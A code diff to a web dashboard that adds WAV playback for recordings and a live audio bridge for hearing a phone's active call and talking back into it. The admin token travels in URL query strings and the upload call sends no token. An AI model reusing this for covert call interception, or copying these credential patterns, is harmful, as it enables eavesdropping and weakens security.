@@ -929,6 +929,7 @@ function renderRecordings(recordings) {
     const dateStr = formatTimestamp(rec.timestamp);
     const sizeMB = (rec.size / (1024 * 1024)).toFixed(2);
     const playUrl = config.serverUrl + rec.url;
+    const audioType = rec.filename.endsWith('.wav') ? 'audio/wav' : 'audio/mp4';
 
     return `
       <tr style="border-bottom: 1px solid var(--theme-border);">
@@ -937,7 +938,7 @@ function renderRecordings(recordings) {
         <td style="padding: 12px 8px; color: var(--theme-text);">${sizeMB} MB</td>
         <td style="padding: 12px 8px; text-align: center;">
           <audio controls preload="metadata" style="max-height: 30px; min-width: 200px;">
-            <source src="${playUrl}" type="audio/mp4">
+            <source src="${playUrl}" type="${audioType}">
             Your browser does not support the audio element.
           </audio>
         </td>
@@ -992,6 +993,196 @@ async function deleteRecording(recordingId) {
     }
   } catch (error) {
     showFeedback(`Error: ${error.message}`, 'error');
+  }
+}
+
+// ==========================================
+// LIVE HEARING & SPEAKING (AUDIO BRIDGE)
+// ==========================================
+
+let audioContext = null;
+let hearStreamReader = null;
+let isHearing = false;
+
+let talkAudioContext = null;
+let talkStream = null;
+let talkProcessor = null;
+let isTalking = false;
+
+// 1. Listen Live (Hear Phone Call)
+const startHearBtn = document.getElementById('start-hear-btn');
+const hearVisualizer = document.getElementById('hear-visualizer');
+
+if (startHearBtn) {
+  startHearBtn.addEventListener('click', async () => {
+    if (isHearing) {
+      stopHearing();
+    } else {
+      await startHearing();
+    }
+  });
+}
+
+async function startHearing() {
+  try {
+    startHearBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Connecting...`;
+    
+    audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+    let nextStartTime = 0;
+    
+    const response = await fetch(`${config.serverUrl}/api/audio/stream?email=${encodeURIComponent(config.adminEmail)}&token=${encodeURIComponent(config.adminToken)}`);
+    if (!response.ok) {
+      throw new Error(`HTTP Error ${response.status}`);
+    }
+    
+    isHearing = true;
+    startHearBtn.innerHTML = `<i class="fa-solid fa-stop" style="margin-right: 8px;"></i> Stop Listening`;
+    startHearBtn.style.borderColor = '#EF4444';
+    startHearBtn.style.color = '#EF4444';
+    hearVisualizer.style.display = 'flex';
+    
+    const reader = response.body.getReader();
+    hearStreamReader = reader;
+    
+    while (isHearing) {
+      const { done, value } = await reader.read();
+      if (done) break;
+      
+      if (value && value.byteLength > 0) {
+        const arrayBuffer = value.buffer;
+        const int16Array = new Int16Array(arrayBuffer);
+        const float32Array = new Float32Array(int16Array.length);
+        for (let i = 0; i < int16Array.length; i++) {
+          float32Array[i] = int16Array[i] / 32768.0;
+        }
+        
+        if (audioContext.state === 'suspended') {
+          await audioContext.resume();
+        }
+        
+        const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
+        audioBuffer.copyToChannel(float32Array, 0);
+        
+        const source = audioContext.createBufferSource();
+        source.buffer = audioBuffer;
+        source.connect(audioContext.destination);
+        
+        const currentTime = audioContext.currentTime;
+        if (nextStartTime < currentTime) {
+          nextStartTime = currentTime + 0.05;
+        }
+        source.start(nextStartTime);
+        nextStartTime += audioBuffer.duration;
+      }
+    }
+  } catch (err) {
+    console.error('Failed to hear stream:', err);
+    alert('Live audio stream connection failed. Make sure the phone is actively in a call and online!');
+    stopHearing();
+  }
+}
+
+function stopHearing() {
+  isHearing = false;
+  if (hearStreamReader) {
+    try { hearStreamReader.cancel(); } catch (e) {}
+    hearStreamReader = null;
+  }
+  if (audioContext) {
+    try { audioContext.close(); } catch (e) {}
+    audioContext = null;
+  }
+  if (startHearBtn) {
+    startHearBtn.innerHTML = `<i class="fa-solid fa-play" style="margin-right: 8px;"></i> Start Listening`;
+    startHearBtn.style.borderColor = '#6366F1';
+    startHearBtn.style.color = '#6366F1';
+  }
+  if (hearVisualizer) {
+    hearVisualizer.style.display = 'none';
+  }
+}
+
+// 2. Speak Live (Talk to Phone)
+const startTalkBtn = document.getElementById('start-talk-btn');
+const talkIndicator = document.getElementById('talk-indicator');
+
+if (startTalkBtn) {
+  startTalkBtn.addEventListener('click', async () => {
+    if (isTalking) {
+      stopTalking();
+    } else {
+      await startTalking();
+    }
+  });
+}
+
+async function startTalking() {
+  try {
+    startTalkBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Starting Mic...`;
+    
+    talkStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    
+    talkAudioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+    const source = talkAudioContext.createMediaStreamSource(talkStream);
+    
+    talkProcessor = talkAudioContext.createScriptProcessor(4096, 1, 1);
+    
+    talkProcessor.onaudioprocess = (e) => {
+      if (!isTalking) return;
+      
+      const float32Data = e.inputBuffer.getChannelData(0);
+      const int16Data = new Int16Array(float32Data.length);
+      for (let i = 0; i < float32Data.length; i++) {
+        int16Data[i] = Math.max(-32768, Math.min(32767, float32Data[i] * 32768));
+      }
+      
+      fetch(`${config.serverUrl}/api/audio/upload-web?email=${encodeURIComponent(config.adminEmail)}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/octet-stream' },
+        body: int16Data.buffer
+      }).catch(err => console.error('Error uploading talk chunk:', err));
+    };
+    
+    source.connect(talkProcessor);
+    talkProcessor.connect(talkAudioContext.destination);
+    
+    isTalking = true;
+    startTalkBtn.innerHTML = `<i class="fa-solid fa-stop" style="margin-right: 8px;"></i> Stop Talking`;
+    startTalkBtn.style.borderColor = '#EF4444';
+    startTalkBtn.style.color = '#EF4444';
+    talkIndicator.style.display = 'block';
+    
+  } catch (err) {
+    console.error('Failed to access microphone:', err);
+    alert('Could not access your microphone. Please grant permission and try again!');
+    stopTalking();
+  }
+}
+
+function stopTalking() {
+  isTalking = false;
+  
+  if (talkProcessor) {
+    try { talkProcessor.disconnect(); } catch (e) {}
+    talkProcessor = null;
+  }
+  if (talkStream) {
+    try {
+      talkStream.getTracks().forEach(track => track.stop());
+    } catch (e) {}
+    talkStream = null;
+  }
+  if (talkAudioContext) {
+    try { talkAudioContext.close(); } catch (e) {}
+    talkAudioContext = null;
+  }
+  if (startTalkBtn) {
+    startTalkBtn.innerHTML = `<i class="fa-solid fa-microphone" style="margin-right: 8px;"></i> Start Talking`;
+    startTalkBtn.style.borderColor = '#EC4899';
+    startTalkBtn.style.color = '#EC4899';
+  }
+  if (talkIndicator) {
+    talkIndicator.style.display = 'none';
   }
 }
 
